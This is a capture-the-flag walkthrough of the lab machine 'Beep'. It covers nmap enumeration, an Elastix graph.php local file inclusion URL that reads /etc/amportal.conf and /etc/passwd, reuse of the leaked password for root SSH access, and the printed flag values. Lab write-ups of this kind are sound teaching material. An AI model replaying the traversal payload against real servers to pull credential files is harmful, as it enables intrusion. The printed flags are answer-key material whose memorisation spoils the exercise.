# Beep

## Enumeration

```
$ nmap -vvv -sCV -oN beep 10.10.10.7
# Nmap 7.80 scan initiated Fri Mar 27 22:31:31 2020 as: nmap -vvv -sCV -oN beep 10.10.10.7
Nmap scan report for 10.10.10.7
Host is up, received syn-ack (0.060s latency).
Scanned at 2020-03-27 22:31:31 CDT for 353s
Not shown: 988 closed ports
Reason: 988 conn-refused
PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68=
|   2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw==
25/tcp    open  smtp       syn-ack Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       syn-ack Apache httpd 2.2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       syn-ack Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE STLS USER UIDL IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) EXPIRE(NEVER) APOP TOP PIPELINING
111/tcp   open  rpcbind    syn-ack 2 (RPC #100000)
143/tcp   open  imap       syn-ack Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: STARTTLS Completed OK NO URLAUTHA0001 X-NETSCAPE IMAP4rev1 MULTIAPPEND CATENATE LISTEXT THREAD=ORDEREDSUBJECT IDLE LITERAL+ BINARY CONDSTORE NAMESPACE LIST-SUBSCRIBED QUOTA SORT=MODSEQ THREAD=REFERENCES ANNOTATEMORE UIDPLUS RIGHTS=kxte RENAME ACL CHILDREN UNSELECT MAILBOX-REFERRALS ID IMAP4 SORT ATOMIC
443/tcp   open  ssl/https? syn-ack
|_ssl-date: 2020-03-28T04:37:36+00:00; +1h02m47s from scanner time.
993/tcp   open  ssl/imap   syn-ack Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       syn-ack Cyrus pop3d
3306/tcp  open  mysql?     syn-ack
|_mysql-info: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp? syn-ack
10000/tcp open  http       syn-ack MiniServ 1.570 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 1h02m46s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 27 22:37:24 2020 -- 1 IP address (1 host up) scanned in 353.41 seconds
```

Opened web browser to 10.10.10.7 and saw the `Elastix`homepage.

```
$ searchsploit elastix
--------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                 |  Path
                                                               | (/usr/share/exploitdb/)
--------------------------------------------------------------- ----------------------------------------
Elastix - 'page' Cross-Site Scripting                          | exploits/php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities        | exploits/php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities  | exploits/php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion               | exploits/php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                              | exploits/php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                             | exploits/php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution         | exploits/php/webapps/18650.py
--------------------------------------------------------------- ----------------------------------------
```

Let's explore this local file inclusion vuln. We don't know the version of Elastix, but let's try it out anyways.

```
$ searchsploit -x exploits/php/webapps/37637.pl
...
...
...
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
...
...
...
```

Open a browser and navigate to `http://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action` and we see the `etc/amportal.conf` file.

```bash
...
# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
...
```

Here are some passwords hardcoded in:

```
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```


Let's pull the `etc/passwd` file to grab a list of users on the box.

`http://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
distcache:x:94:94:Distcache:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
dbus:x:81:81:System message bus:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
Sorry! Attempt to access restricted file.
```


This gives us a list of users on the system. We may be able to brute force an SSH login.

Let's trim this down to real users on the system.

```
root:x:0:0:root:/root:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
spamfilter:x:500:500::/home/spamfilter:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash
```

## Exploitation

We saw earlier that `ssh` is running on port 22. Let's try to ssh in as some of these users using the passwords we extracted above.

```bash
$ ssh root@10.10.10.7
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

Weird. Some stack overflowing revealed that you can specify the ssh key exchange method like so:

```bash
$ ssh -o KexALgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7
root@10.10.10.7's password:
Permission denied, please try again.
root@10.10.10.7's password:
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# 
```

First, I tried `amp111`, which failed, and then I tried `jEhdIekWmdjE`, which got me root. Crazy world.

## Proof

```bash
[root@beep ~]# wc root.txt
 1  1 33 root.txt
[root@beep ~]# cat root.txt
d88e006123842106982acce0aaf453f0
[root@beep /]# wc /home/fanis/user.txt
 1  1 33 /home/fanis/user.txt
[root@beep /]# cat /home/fanis/user.txt
aeff3def0c765c2677b94715cffa73ac
```
